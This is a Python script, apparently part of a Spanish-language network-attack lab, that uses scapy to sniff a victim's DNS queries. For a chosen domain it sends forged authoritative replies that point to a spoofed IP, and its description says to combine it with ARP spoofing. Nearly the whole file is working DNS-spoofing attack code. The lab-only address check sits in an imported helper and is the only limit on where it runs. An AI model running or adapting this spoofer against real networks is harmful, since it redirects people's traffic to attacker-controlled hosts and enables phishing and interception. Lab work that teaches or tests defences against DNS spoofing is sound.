#!/usr/bin/env python3
from __future__ import annotations

import argparse

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sniff

from common import iface, print_banner, require_lab_ip, require_root_hint, setup_scapy


def main():
    parser = argparse.ArgumentParser(
        description=(
            "DNS spoofing controlado. Normalmente debe combinarse con ARP spoofing "
            "entre victim-client y dns-server para observar la consulta."
        )
    )
    parser.add_argument("--victim", default="victim-client")
    parser.add_argument("--domain", default="demo.local")
    parser.add_argument("--spoof-ip", default="10.10.10.40")
    parser.add_argument("--iface", default=iface())
    args = parser.parse_args()

    require_root_hint()
    setup_scapy()

    victim_ip = require_lab_ip(args.victim)
    spoof_ip = require_lab_ip(args.spoof_ip)
    domain = args.domain.rstrip(".").lower() + "."

    print_banner("DNS spoofing lab")
    print(f"victim={victim_ip}")
    print(f"domain={domain}")
    print(f"spoof_ip={spoof_ip}")
    print("[*] Esperando consultas DNS. Ctrl+C para salir.")

    def handle(pkt):
        if not pkt.haslayer(IP) or not pkt.haslayer(UDP) or not pkt.haslayer(DNS) or not pkt.haslayer(DNSQR):
            return

        if pkt[IP].src != victim_ip:
            return

        if pkt[UDP].dport != 53:
            return

        qname = str(pkt[DNSQR].qname).lower()
        if qname != domain:
            print(f"[DNS] Ignorando consulta {qname} desde {pkt[IP].src}")
            return

        print(f"[DNS] Spoofing {qname} para {pkt[IP].src}:{pkt[UDP].sport} -> {spoof_ip}")

        response = (
            IP(dst=pkt[IP].src, src=pkt[IP].dst)
            / UDP(dport=pkt[UDP].sport, sport=53)
            / DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                ra=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNSQR].qname, ttl=30, rdata=spoof_ip),
            )
        )
        send(response, verbose=False)

    sniff(iface=args.iface, filter="udp port 53", prn=handle, store=False)


if __name__ == "__main__":
    main()
